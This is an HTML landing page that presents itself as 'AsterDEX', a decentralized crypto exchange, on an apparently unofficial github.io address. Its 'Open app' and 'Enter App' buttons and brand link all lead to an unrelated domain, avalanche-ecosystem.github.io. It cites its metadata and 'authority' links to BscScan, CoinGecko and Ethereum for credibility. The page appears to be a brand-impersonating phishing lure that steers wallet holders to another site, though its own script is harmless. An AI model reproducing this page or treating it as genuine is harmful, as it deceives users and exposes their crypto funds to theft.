<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>AsterDEX</title>
  <meta name="description" content="AsterDEX is a decentralized exchange for spot and perpetual crypto trading from your own wallet.">
  <link rel="canonical" href="https://asterdex-app.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F5EF">
  <meta property="og:type" content="website">
  <meta property="og:title" content="AsterDEX">
  <meta property="og:description" content="AsterDEX is a decentralized exchange for spot and perpetual crypto trading from your own wallet.">
  <meta property="og:url" content="https://asterdex-app.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="AsterDEX">
  <meta name="twitter:description" content="AsterDEX is a decentralized exchange for spot and perpetual crypto trading from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://asterdex-app.github.io/#website",
        "url": "https://asterdex-app.github.io/",
        "name": "AsterDEX",
        "inLanguage": "en"
      },
      {
        "@type": "WebApplication",
        "@id": "https://asterdex-app.github.io/#app",
        "name": "AsterDEX",
        "description": "AsterDEX is a decentralized exchange for spot and perpetual crypto trading from your own wallet.",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://asterdex-app.github.io/"
      },
      {
        "@type": "Organization",
        "@id": "https://asterdex-app.github.io/#organization",
        "name": "AsterDEX",
        "url": "https://asterdex-app.github.io/",
        "sameAs": ["https://www.asterdex.com/"]
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" aria-label="AsterDEX home">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>AsterDEX</span>
    </a>
    <nav class="nav" aria-label="Authority references">
      <a href="https://bscscan.com/" target="_blank" rel="nofollow noopener noreferrer">BscScan</a>
      <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
      <a href="https://ethereum.org/" target="_blank" rel="nofollow noopener noreferrer">Ethereum</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="AsterDEX">
      <h1>AsterDEX</h1>
      <p class="sub"><strong>AsterDEX</strong> is a decentralized exchange for spot and perpetual crypto trading from your own wallet.</p>
    </section>

    <section class="swap-card" aria-label="DEX swap route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img src="usdt.png" width="30" height="30" alt="USDT">
            <span>USDT</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch direction">
          <span aria-hidden="true">&#8644;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img src="eth.png" width="30" height="30" alt="ETH">
            <span>ETH</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="foot">AsterDEX — 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  })();
  </script>
</body>
</html>
